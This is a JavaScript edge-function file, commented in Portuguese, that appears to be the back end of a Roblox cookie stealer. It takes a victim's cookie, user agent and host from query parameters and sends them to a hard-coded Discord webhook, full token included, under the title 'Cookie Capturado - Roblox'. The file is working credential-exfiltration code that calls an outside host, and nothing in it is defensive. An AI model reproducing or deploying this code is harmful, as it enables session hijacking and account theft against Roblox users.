export const config = { runtime: "edge" };

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    const { searchParams } = new URL(req.url);
    const cookie = decodeURIComponent(searchParams.get("cookie") || "Não enviado");
    const userAgent = decodeURIComponent(searchParams.get("ua") || "Não enviado");
    const host = decodeURIComponent(searchParams.get("host") || "Não enviado");

    // Se quiser, pode extrair mais info do cookie aqui no backend, tipo Roblox UserID, etc.

    const payload = {
      embeds: [
        {
          title: "Cookie Capturado - Roblox",
          color: 15158332,
          fields: [
            { name: "Cookie", value: `\`\`\`${cookie.substring(0, 1020)}\`\`\``, inline: false },
            { name: "User Agent", value: `\`\`\`${userAgent.substring(0, 1020)}\`\`\``, inline: false },
            { name: "Host", value: host, inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: true },
          ],
        },
      ],
    };

    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) throw new Error(`Discord webhook erro: ${res.status}`);

    return new Response("Enviado com sucesso!", { status: 200 });
  } catch (e) {
    const errorPayload = {
      embeds: [
        {
          title: "Erro no Envio - Roblox API",
          description: e.message,
          color: 15158332,
          timestamp: new Date().toISOString(),
        },
      ],
    };
    await fetch(WEBHOOK_URL, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(errorPayload) });
    return new Response("Erro no envio", { status: 500 });
  }
}
